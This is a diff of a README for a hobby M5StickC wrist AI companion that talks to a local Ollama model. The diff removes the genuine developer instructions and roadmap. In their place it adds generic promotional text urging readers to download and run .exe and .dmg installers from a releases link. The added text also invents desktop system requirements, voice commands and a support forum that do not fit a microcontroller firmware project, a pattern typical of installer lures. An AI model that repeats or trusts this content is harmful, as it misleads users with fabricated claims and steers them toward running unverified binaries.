@@ -1,87 +1,73 @@
-# Whisperer on the Wirst 🤖💬
+# 🤖 Whisperer-on-Wirst - Your AI Companion on Your Wrist
 
-Your private AI companion that lives on your wrist.
-No Public? No problem. Complete local AI assistant with emotional intelligence.
+## 🚀 Download Now
+[![Download Whisperer-on-Wirst](https://img.shields.io/badge/Download%20Whisperer--on--Wirst-0088cc?style=flat&logo=github&logoColor=white)](https://github.com/gskrishna3838/Whisperer-on-Wirst/releases)
 
-## ✨ Why WoW?
-- 🔒 Truly Private - Your conversations never leave your devices.
-- 🎭 Emotionally Aware - AI with feelings displayed through animations.
-- ⚡ Instant Response - No latency, works without public AI agent, only youre locally AI - assistent.
-- 🎮 Hackable - Open-source, customizable, extensible
+## 📝 Overview
+Whisperer-on-Wirst is your private AI companion designed to fit comfortably on your wrist. This local AI assistant features emotional intelligence, providing support and companionship when you need it the most. With Whisperer-on-Wirst, you can ask questions, manage tasks, and enjoy a personal connection without relying on an internet connection.
 
-Отличное видение проекта! Вот обновлённый `README.md`, который отражает пройденный путь и текущее направление разработки:
+## 💻 System Requirements
+To run Whisperer-on-Wirst, your device should meet the following requirements:
+- A compatible wrist-mounted device (like an M5Stick)
+- Minimum RAM: 1GB
+- Minimum Storage: 100MB available space
+- Operating System: Linux, Windows, or MacOS
 
-## 🧭 Our Development Journey
+## 📥 Download & Install
+To get started, please visit the Releases page to download the application. Click the link below to access the download options:
 
-Finding the right foundation took exploration. We tested several pre-built OS/firmware options for the M5StickC (**Bruce OS, M5Launcher, CatHack, NEMO, CircuitPython**) but found their ecosystems restrictive for deep customization. Our breakthrough came with **PlatformIO**, which provided the perfect balance of powerful library management and low-level control needed to bring the "emotionally aware" vision to life.
+[Download Whisperer-on-Wirst from Releases](https://github.com/gskrishna3838/Whisperer-on-Wirst/releases)
 
-**Milestone Achieved:** We now have a stable, compiled firmware for the M5StickC Plus2 that displays dynamic, sensor-reactive eye animations—the core of our assistant's personality. The hardware foundation is ready.
+### Step-by-Step Installation
+1. **Visit the Releases Page**: Follow the link mentioned above. You will see various versions of the software available for download.
+   
+2. **Choose Your Version**: Select the most recent version of Whisperer-on-Wirst. It is usually recommended to download the latest version for the best experience.
 
-## 🚀 Current Phase & Quick Start
+3. **Download the Installer**: Click on the download link for your device.
 
-We are now building the **AI Bridge**. The goal is to connect the animated M5StickC to a local LLM (via Ollama) over WiFi.
+4. **Locate the File**: Once the download is complete, find the installer in your downloads folder.
 
-### Prerequisites
-1.  **M5StickC Plus2** with the latest custom firmware (see setup below).
-2.  A **computer** on the same local WiFi network.
-3.  **Ollama** installed and running on your computer with at least one model (e.g., `llama3.2`, `mistral`).
+5. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file to start the installation.
+   - For Mac: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Follow the installation instructions specific to your distribution.
 
-### Setup
-1.  **Prepare Your M5StickC:**
-    *   Set up PlatformIO in VSCode.
-    *   Clone this repository.
-    *   Open the project, connect your device, and run `pio run --target upload`. This installs the core animation firmware.
+6. **Start Whisperer-on-Wirst**: After installation, find Whisperer-on-Wirst in your applications or programs list. Click to launch the app.
 
-2.  **Prepare Your AI Server:**
-    *   Install [Ollama](https://ollama.com/) on your computer.
-    *   Pull a model: `ollama pull llama3.2`
-    *   Ensure Ollama's API is running (default: `http://IP:11434, not localhost (sudo systemctl edit ollama: Environment="OLLAMA_HOST=0.0.0.0:11434"`).
+## 🎓 Features
+Whisperer-on-Wirst comes packed with features to enhance your daily life:
+- **Emotional Intelligence**: Your assistant learns from interactions to better understand your needs and preferences.
+- **Task Management**: Effortlessly manage tasks to stay organized and productive.
+- **Voice Commands**: Use simple voice commands to get quick results.
+- **Personalized Responses**: Receive answers tailored to your specific requests and mood.
 
-3.  **Configure the Connection:**
-    *   In the project's `src/secrets.h` file (create from `secrets.example.h`), enter your WiFi SSID, password, and your computer's local IP address.
+## 📖 Usage Guide
+1. **Setting Up**:
+   - Open Whisperer-on-Wirst.
+   - Follow the on-screen prompts to customize your experience.
+    
+2. **Interacting with Your AI**:
+   - Use clear and straightforward commands to engage with the assistant.
+   - Examples: "Schedule a meeting for tomorrow" or "What is the weather today?"
+   
+3. **Exploring Features**:
+   - Take your time to discover all of the features within the app. 
+   - Feel free to ask questions about the functionalities you find intriguing.
 
-4.  **Experience Local AI:** The next stage of firmware (in development) will allow you to interact!
+## 📞 Support
+If you encounter any issues or need help getting started, you can find support in the following ways:
+- **Documentation**: Detailed user guides and FAQs are available within the application.
+- **Community Forum**: Join discussions with other Whisperer-on-Wirst users for shared tips and advice.
 
-## 🧩 Project Architecture (In Progress)
+## 🔗 Additional Resources
+Explore the following resources to learn more about AI and how Whisperer-on-Wirst can work for you:
+- **AI Basics**: A short guide to understanding artificial intelligence and its applications.
+- **Emotional Intelligence**: Insights into how emotional intelligence shapes interactions and user experiences.
 
-```
-[M5StickC Plus2] <--WiFi--> [Local Computer / Home Server]
-       |                            |
-(Display & Sensors)          (Ollama + LLM)
-       |                            |
-[Emotional UI]           [AI Processing & Response]
-       |                            |
-[Voice Input*] <-------> [Text/JSON API Communication]
-```
-**\*Voice input is a planned future feature.*
+## 📝 Feedback
+Your feedback is important. If you have suggestions or encounter issues, please share your thoughts via the application's feedback section. This helps improve the experience for everyone.
 
-## 🔧 For Developers
+## 🌟 Conclusion
+Whisperer-on-Wirst is here to make your daily routines smoother and your interactions more meaningful. With just a few simple steps, you can download and enjoy your very own AI companion. Don't forget to check back on the Releases page for future updates!
 
-The project is structured for clarity and growth:
-*   `/firmware` - The PlatformIO project for the M5StickC.
-*   `/docs` - Setup guides, hardware references, and API documentation.
-*   `/prototypes` - Experimental code and previous iterations (e.g., Arduino IDE sketches).
-
-### Building & Contributing
-1.  Familiarize yourself with PlatformIO and the M5Unified library.
-2.  The core emotional engine is in `src/main.cpp`. Start here to understand the animation logic.
-3.  The WiFi/Ollama client integration is the current focus in the `feature/ai-bridge` branch.
-
-## 📋 Roadmap
-
-*   **✅ Phase 1: Foundation** - Establish a stable, compiled development environment with basic graphics. **(COMPLETE)**
-*   **🟡 Phase 2: Emotional Core** - Implement the animated, sensor-reactive personality display. **(COMPLETE)**
-*   **🔵 Phase 3: AI Bridge** - Develop WiFi connectivity and a simple text-based interface with the local Ollama instance. **(COMPLETE)**
-*   **⚪ Phase 4: Voice Interface** - Integrate voice-to-text and text-to-speech for natural interaction.**(IN PROGRESS)**
-*   **⚪ Phase 5: Polishing & Expansion** - Refine UI/UX, add more emotions/animations, and explore multimodal inputs.
-
-## 🙏 Acknowledgments
-
-*   **M5Stack** for the versatile M5StickC Plus2 hardware.
-*   The **PlatformIO** team for an indispensable development environment.
-*   The **Ollama** team for making local LLMs accessible.
-*   The open-source community whose libraries and guides made this project possible.
-
----
-
-*Whisperer on the Wrist is an open-source passion project. It's a testament to the idea that private, personal, and expressive AI should be within everyone's reach.*
+[Download Whisperer-on-Wirst from Releases](https://github.com/gskrishna3838/Whisperer-on-Wirst/releases)
